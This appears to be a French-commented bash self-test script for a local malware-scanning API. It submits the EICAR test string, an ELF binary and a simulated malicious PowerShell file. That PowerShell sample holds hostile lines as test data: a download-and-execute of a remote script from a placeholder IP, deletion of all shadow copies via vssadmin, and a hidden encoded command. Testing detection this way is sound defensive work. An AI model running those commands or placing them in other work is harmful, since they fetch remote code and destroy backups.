#!/bin/bash
# selftest.sh — Tests de validation du scanner sur le VPS.
set -u
API="http://127.0.0.1:3004/api/scan"
jq_get() { python3 -c "import sys,json;d=json.load(sys.stdin);print($1)"; }

# 1. EICAR (construit en deux morceaux pour ne pas stocker la string en clair dans le repo)
P1='X5O!P%@AP[4\PZX54(P^)7CC)7}'
P2='$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
printf '%s%s' "$P1" "$P2" > /tmp/e.com
echo -n "EICAR  -> "
curl -s -F file=@/tmp/e.com "$API" | jq_get 'd["verdict"], d["verdict_score"], "clamav="+str(d["clamav"] is not None)'

# 2. Script PowerShell malveillant simulé
printf 'IEX (New-Object Net.WebClient).DownloadString("http://198.51.100.7/p.ps1")\nvssadmin delete shadows /all\npowershell -EncodedCommand AAAA -WindowStyle Hidden\n' > /tmp/m.ps1
echo -n "PS1    -> "
curl -s -F file=@/tmp/m.ps1 "$API" | jq_get 'd["verdict"], d["verdict_score"], "yara="+str(len(d["yara_matches"])), "iocs="+str(len(d["ioc_list"]))'

# 3. Binaire ELF réel (parsing Linux)
echo -n "ELF    -> "
curl -s -F file=@/bin/ls "$API" | jq_get 'd["binary_info"]["format"], str(len(d["binary_info"]["sections"]))+" sections", d["verdict"]'

# 4. Health
echo -n "HEALTH -> "
curl -s http://127.0.0.1:3004/api/health | jq_get 'd["status"], "clamav="+str(d["clamav"]["loaded"])'

rm -f /tmp/e.com /tmp/m.ps1
